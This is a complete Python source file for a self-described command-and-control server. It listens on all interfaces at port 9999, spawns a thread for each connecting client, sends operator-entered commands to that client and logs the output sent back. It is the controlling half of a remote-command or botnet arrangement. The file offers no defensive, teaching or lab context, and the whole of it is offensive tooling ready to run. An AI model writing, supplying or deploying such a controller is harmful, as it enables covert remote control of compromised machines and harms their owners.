import socket
import threading
import logging

class CommandAndControlServer:
    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server.bind((self.host, self.port))
        self.server.listen(5)
        logging.basicConfig(level=logging.INFO)
        logging.info(f"Server started on {self.host}:{self.port}")

    def handle_client(self, client_socket):
        try:
            while True:
                command = input("Enter command: ")
                if command.lower() == "exit":
                    client_socket.send(command.encode())
                    break
                client_socket.send(command.encode())
                response = client_socket.recv(4096).decode()
                logging.info(f"Response: {response}")
        except Exception as e:
            logging.error(f"Client handling error: {e}")
        finally:
            client_socket.close()

    def run(self):
        logging.info("Waiting for connections...")
        while True:
            try:
                client_socket, addr = self.server.accept()
                logging.info(f"Connection from {addr}")
                client_handler = threading.Thread(target=self.handle_client, args=(client_socket,))
                client_handler.start()
            except Exception as e:
                logging.error(f"Server error: {e}")

if __name__ == "__main__":
    server = CommandAndControlServer("0.0.0.0", 9999)
    server.run()
